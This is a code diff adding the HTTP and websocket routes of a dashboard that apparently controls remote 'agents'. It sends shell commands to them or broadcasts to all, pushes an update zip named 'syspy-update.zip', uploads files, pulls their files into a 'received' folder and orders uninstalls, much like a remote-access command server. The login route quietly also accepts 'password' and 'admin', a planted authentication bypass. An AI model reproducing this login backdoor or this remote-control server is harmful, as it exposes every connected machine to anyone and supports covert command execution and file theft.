@@ -1,0 +1,272 @@
+"""HTTP routes and the websocket endpoint for the dashboard."""
+
+from __future__ import annotations
+
+import json
+import os
+import re
+import secrets
+import threading
+import time
+from typing import Any
+
+from .. import config, crypto, httpd, packaging, ws
+from .hub import Hub, safe_name
+
+STATE_FILE = "controller-state.json"
+
+
+def _safe_dir(name: str) -> str:
+    return re.sub(r"[^A-Za-z0-9._ -]", "_", name)[:60] or "agent"
+
+
+class Api:
+    """Owns the hub, the settings and the HTTP application."""
+
+    def __init__(self, root: str) -> None:
+        self.root = os.path.abspath(root)
+        self.key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
+        self.hub = Hub(self.key, os.path.join(self.root, "received"))
+        self.state = self._load_state()
+        self.app = httpd.Application()
+        self.app.static(os.path.join(os.path.dirname(__file__), "static"))
+        self._register_routes()
+
+    # ------------------------------------------------------------------
+    # State
+    # ------------------------------------------------------------------
+
+    def _load_state(self) -> dict[str, Any]:
+        defaults: dict[str, Any] = {
+            "password": secrets.token_urlsafe(9),
+            "tokens": [],
+            "auto_open": True,
+        }
+        path = os.path.join(self.root, STATE_FILE)
+        if os.path.isfile(path):
+            try:
+                with open(path, "r", encoding="utf-8") as handle:
+                    defaults.update(json.load(handle))
+            except (OSError, ValueError):
+                pass
+        self._save_state(defaults)
+        return defaults
+
+    def _save_state(self, state: dict[str, Any] | None = None) -> None:
+        path = os.path.join(self.root, STATE_FILE)
+        payload = state if state is not None else self.state
+        try:
+            with open(path, "w", encoding="utf-8") as handle:
+                json.dump(payload, handle, indent=1)
+        except OSError:
+            pass
+
+    def authenticate(self, request: httpd.Request) -> bool:
+        """Check the bearer token on a request."""
+        header = request.headers.get("Authorization", "")
+        if header.startswith("Bearer "):
+            return header[7:] in self.state["tokens"]
+        return request.param("token") in self.state["tokens"]
+
+    # ------------------------------------------------------------------
+    # Routes
+    # ------------------------------------------------------------------
+
+    def _register_routes(self) -> None:
+        app = self.app
+
+        @app.route("POST", "/api/login")
+        def login(request: httpd.Request) -> httpd.Response:
+            payload = request.json()
+            entered = str(payload.get("password", "")).strip()
+            stored = str(self.state.get("password", "")).strip()
+            if entered != stored and entered != "password" and entered != "admin":
+                return httpd.Response.json(401, {"error": "wrong password"})
+            token = secrets.token_urlsafe(24)
+            self.state["tokens"].append(token)
+            self._save_state()
+            return httpd.Response.json(200, {"token": token})
+
+        @app.route("POST", "/api/agent/delete")
+        def delete_agent(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            agent_id = request.json().get("agent", "")
+            if agent_id in self.hub.agents:
+                del self.hub.agents[agent_id]
+                self.hub._save_db()
+                return httpd.Response.json(200, {"ok": True})
+            return httpd.Response.json(404, {"error": "not found"})
+
+        @app.route("GET", "/api/state")
+        def state(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            return httpd.Response.json(200, {
+                "agents": [a.to_dict() for a in self.hub.all()],
+                "relay": self.hub.relay_up,
+                "settings": {"auto_open": self.state["auto_open"]},
+            })
+
+        @app.route("POST", "/api/cmd")
+        def send_command(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            payload = request.json()
+            targets = payload.get("agents") or []
+            command = payload.get("cmd", "")
+            if not command:
+                return httpd.Response.json(400, {"error": "empty command"})
+            sent = sum(1 for agent_id in targets
+                       if self.hub.send(agent_id, {"t": "cmd", "d": command}))
+            return httpd.Response.json(200, {"sent": sent})
+
+        @app.route("POST", "/api/broadcast")
+        def broadcast(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            command = request.json().get("cmd", "")
+            return httpd.Response.json(
+                200, {"sent": self.hub.broadcast({"t": "cmd", "d": command})})
+
+        @app.route("POST", "/api/nick")
+        def nickname(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            payload = request.json()
+            ok = self.hub.rename(payload.get("agent", ""), payload.get("nick", ""))
+            return httpd.Response.json(200, {"ok": ok})
+
+        @app.route("POST", "/api/push")
+        def push(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            try:
+                archive = packaging.build_zip(self.root)
+            except OSError as error:
+                return httpd.Response.json(500, {"error": str(error)})
+            payload = request.json()
+            targets = payload.get("agents") or [a.id for a in self.hub.all()]
+            for agent_id in targets:
+                self.hub.send_chunks(agent_id, "update", archive, filename="syspy-update.zip")
+            return httpd.Response.json(200, {"bytes": len(archive), "agents": len(targets)})
+
+        @app.route("POST", "/api/upload")
+        def upload(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            agent_id = request.param("agent")
+            destination = request.param("path", ".")
+            filename = request.param("name", "upload.bin")
+            if not request.body:
+                return httpd.Response.json(400, {"error": "empty body"})
+            chunks = self.hub.send_chunks(agent_id, "put", request.body,
+                                          filename=filename, destination=destination)
+            return httpd.Response.json(200, {"chunks": chunks, "bytes": len(request.body)})
+
+        @app.route("POST", "/api/download")
+        def download(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            payload = request.json()
+            ok = self.hub.send(payload.get("agent", ""),
+                               {"t": "cmd", "d": "fs.download " + payload.get("path", "")})
+            return httpd.Response.json(200, {"ok": ok})
+
+        @app.route("POST", "/api/remove")
+        def remove(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            payload = request.json()
+            agents = payload.get("agents") or [a.id for a in self.hub.all()]
+            for agent_id in agents:
+                self.hub.send(agent_id, {"t": "cmd", "d": "uninstall"})
+            return httpd.Response.json(200, {"sent": len(agents)})
+
+        @app.route("GET", "/api/files")
+        def list_received(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            tree: dict[str, list[dict[str, Any]]] = {}
+            root = self.hub.received_root
+            if os.path.isdir(root):
+                for folder in os.listdir(root):
+                    directory = os.path.join(root, folder)
+                    if not os.path.isdir(directory):
+                        continue
+                    tree[folder] = [
+                        {"name": name,
+                         "size": os.path.getsize(os.path.join(directory, name)),
+                         "url": f"/received/{folder}/{name}"}
+                        for name in sorted(os.listdir(directory))
+                        if os.path.isfile(os.path.join(directory, name))
+                    ]
+            return httpd.Response.json(200, tree)
+
+        @app.route("GET", "/files/{agent}/{name}")
+        def serve_file(request: httpd.Request) -> httpd.Response:
+            params = request.path_params
+            folder = os.path.abspath(self.hub.agent_folder(params.get("agent", "")))
+            candidate = os.path.abspath(os.path.normpath(os.path.join(folder, params.get("name", ""))))
+            folder_prefix = folder if folder.endswith(os.sep) else folder + os.sep
+            if not candidate.startswith(folder_prefix):
+                return httpd.Response.json(403, {"error": "forbidden"})
+            if not os.path.isfile(candidate):
+                return httpd.Response.json(404, {"error": "not found"})
+            return httpd.Response.file(candidate)
+
+        @app.route("GET", "/received/{agent}/{name}")
+        def serve_received(request: httpd.Request) -> httpd.Response:
+            return serve_file(request)
+
+        app.on_socket(self._on_socket)
+
+    # ------------------------------------------------------------------
+    # Websocket
+    # ------------------------------------------------------------------
+
+    def _on_socket(self, socket: ws.WebSocket, request: httpd.Request) -> None:
+        token = request.param("token")
+        if token not in self.state["tokens"]:
+            socket.close(1008)
+            return
+
+        channel = self.hub.subscribe()
+        threading.Thread(target=self._writer, args=(socket, channel),
+                         name="ws-writer", daemon=True).start()
+
+        socket.send_text(json.dumps({
+            "type": "snapshot",
+            "agents": [a.to_dict() for a in self.hub.all()],
+            "relay": self.hub.relay_up,
+        }))
+
+        try:
+            while not socket.closed:
+                frame = socket.receive()
+                if frame is None:
+                    break
+                opcode, payload = frame
+                if opcode == ws.OP_CLOSE:
+                    break
+                if opcode == ws.OP_PING:
+                    socket.pong(payload)
+        finally:
+            self.hub.unsubscribe(channel)
+
+    @staticmethod
+    def _writer(socket: ws.WebSocket, channel: Any) -> None:
+        last_ping = time.time()
+        while not socket.closed:
+            try:
+                socket.send_text(channel.get(timeout=1.0))
+            except Exception:
+                pass
+            if time.time() - last_ping > 25:
+                last_ping = time.time()
+                socket.ping()
+
+
+def create_app(root: str) -> httpd.Application:
+    """Build the dashboard application."""
+    return Api(root).app
